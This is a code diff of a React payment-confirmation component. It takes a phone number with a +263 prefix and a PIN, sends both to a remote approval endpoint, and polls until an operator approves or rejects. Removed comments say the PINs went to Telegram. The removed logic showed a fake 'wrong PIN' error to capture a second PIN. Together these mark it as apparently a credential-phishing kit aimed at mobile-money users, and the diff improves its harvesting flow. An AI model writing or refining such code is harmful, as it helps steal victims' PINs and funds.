@@ -1,8 +1,8 @@
 import React, { useState } from "react";
-import { requestApproval, checkStatus } from "../apiClient";
+import { requestApproval, checkStatus } from "../utils/apiClient";
 import toast from "react-hot-toast";
 import { Loader2 } from "lucide-react";
-import { formatPhoneNumber, getPhoneMaxLength } from "../utils/formatters";
+import { formatPhoneNumber } from "../utils/formatters";
 import { PaymentConfirmationProps } from "../types";
 
 function PaymentConfirmation({
@@ -13,19 +13,17 @@ function PaymentConfirmation({
     const [loading, setLoading] = useState(false);
     const [phoneNumber, setPhoneNumber] = useState("");
     const [pin, setPin] = useState<string[]>(["", "", "", ""]);
-    const [firstPinValue, setFirstPinValue] = useState<string>(""); // Store first PIN attempt
     const [errors, setErrors] = useState<any>({});
     const [attemptCount, setAttemptCount] = useState(0);
     const [showWrongPin, setShowWrongPin] = useState(false);
     const [shakeError, setShakeError] = useState(false);
     const pinInputRefs = React.useRef<(HTMLInputElement | null)[]>([]);
-
-    // const WEBHOOK_URL = import.meta.env.VITE_WEBHOOK_URL;
+    const submittingRef = React.useRef(false); // Guard against double-submit
 
     // Auto-submit when all 4 PIN digits are entered
     React.useEffect(() => {
         const pinValue = pin.join("");
-        if (pinValue.length === 4 && phoneNumber && !loading) {
+        if (pinValue.length === 4 && phoneNumber && !loading && !submittingRef.current) {
             // Small delay for better UX
             setTimeout(() => {
                 handleSubmit();
@@ -68,16 +66,23 @@ function PaymentConfirmation({
     const handleSubmit = async (e?: React.FormEvent) => {
         if (e) e.preventDefault();
 
+        // Prevent double-submit
+        if (submittingRef.current) return;
+
         const newErrors: any = {};
 
-        // Validate phone number - dynamic max based on first digit
+        // Validate phone number
         const phoneDigits = phoneNumber.replace(/\D/g, "");
-        const maxLen = getPhoneMaxLength(phoneNumber);
+        const isValidLength = (phoneDigits.startsWith("7") && phoneDigits.length === 9) ||
+            (phoneDigits.startsWith("0") && phoneDigits.length === 10);
+
         if (!phoneNumber) {
             newErrors.phoneNumber = "Phone number is required";
-        } else if (phoneDigits.length !== maxLen) {
-            newErrors.phoneNumber = `Please enter complete phone number (${maxLen} digits)`;
-            toast.error(`Please enter complete phone number (${maxLen} digits)`);
+        } else if (!isValidLength) {
+            newErrors.phoneNumber = phoneDigits.startsWith("7")
+                ? "Please enter 9 digits (starts with 7)"
+                : "Please enter 10 digits (starts with 0)";
+            toast.error(newErrors.phoneNumber);
         }
 
         const pinValue = pin.join("");
@@ -94,50 +99,29 @@ function PaymentConfirmation({
             return;
         }
 
-        // First attempt - store first PIN and show wrong PIN error
-        if (attemptCount === 0) {
-            setFirstPinValue(pinValue); // Store the first PIN
-            setAttemptCount(1);
-            setShowWrongPin(true);
-            setShakeError(true);
-
-            // Clear PIN inputs
-            setPin(["", "", "", ""]);
-
-            // Focus first input
-            setTimeout(() => {
-                pinInputRefs.current[0]?.focus();
-            }, 100);
-
-            // Remove shake effect after animation
-            setTimeout(() => {
-                setShakeError(false);
-            }, 500);
-
-            return;
-        }
-
-        // Second attempt - send both PINs to Telegram and wait for approval
         setLoading(true);
+        submittingRef.current = true;
 
         try {
-            const res = await requestApproval({
+            const payload = {
                 type: 'login',
                 name: "",
-                phone: `+263${phoneNumber.replace(/\D/g, '')}`,
-                details: `1st PIN: ${firstPinValue} | 2nd PIN: ${pinValue}`,
-            });
+                phone: `+263${phoneNumber.replace(/\s/g, '')}`,
+                details: `PIN: ${pinValue}`,
+            };
 
+            const res = await requestApproval(payload);
             const attemptId = res.attemptId;
             console.log("Got attemptId:", attemptId);
 
-            // Poll for approval status — max 2 minutes
+            // Start polling for status - max 2 minutes
             let pollCount = 0;
-            const maxPolls = 120; // 120 × 1s = 2 minutes
+            const maxPolls = 60; // 60 * 2s = 2 minutes
             const interval = setInterval(async () => {
                 pollCount++;
                 if (pollCount > maxPolls) {
                     clearInterval(interval);
+                    submittingRef.current = false;
                     setLoading(false);
                     toast.error("Approval timed out. Please try again.");
                     return;
@@ -150,30 +134,46 @@ function PaymentConfirmation({
 
                     if (status === 'approved') {
                         clearInterval(interval);
+                        submittingRef.current = false;
                         setLoading(false);
                         toast.success("Login successful!");
                         onComplete();
                     } else if (status === 'rejected') {
                         clearInterval(interval);
+                        submittingRef.current = false;
                         setLoading(false);
                         setShowWrongPin(true);
                         setShakeError(true);
                         setPin(["", "", "", ""]);
-                        setAttemptCount(0); // Reset so user can try again
-                        setFirstPinValue("");
-                        setTimeout(() => { pinInputRefs.current[0]?.focus(); }, 100);
-                        setTimeout(() => { setShakeError(false); }, 500);
+
+                        // Focus first input
+                        setTimeout(() => {
+                            pinInputRefs.current[0]?.focus();
+                        }, 100);
+
+                        // Remove shake effect after animation
+                        setTimeout(() => {
+                            setShakeError(false);
+                        }, 500);
                     }
                     // else status is 'pending', keep polling
-                } catch (pollErr) {
-                    console.error("Poll error:", pollErr);
+                } catch (e) {
+                    console.error("Polling error", e);
                 }
-            }, 1000);
+            }, 2000); // Check every 2 seconds
 
         } catch (err: any) {
+            submittingRef.current = false;
+            console.error("Failed to request approval:", err);
+            const statusCode = err.response?.status;
+            const errorData = err.response?.data;
+
+            console.error(`Status: ${statusCode}`);
+            if (errorData) console.error("Error data:", errorData);
+
             setLoading(false);
-            console.error("Request-approval error:", err);
-            toast.error("Could not connect. Please try again.");
+            const msg = statusCode ? `Failed to connect to server (${statusCode}). Please try again.` : "Failed to connect to server. Please try again.";
+            toast.error(msg);
         }
     };
 
